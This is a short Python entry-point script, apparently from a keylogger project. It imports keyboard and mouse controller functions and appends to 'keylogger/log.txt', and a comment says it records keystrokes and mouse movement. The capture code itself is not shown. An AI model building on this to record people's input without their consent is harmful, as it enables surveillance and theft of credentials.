from controller_keyboard import control_keyboard
from controller_mouse import control_mouse

# Program stores key strokes and mouse movement within log file

# Appending
with open('keylogger/log.txt','a') as f:
    f.write('')

control_mouse()
control_keyboard()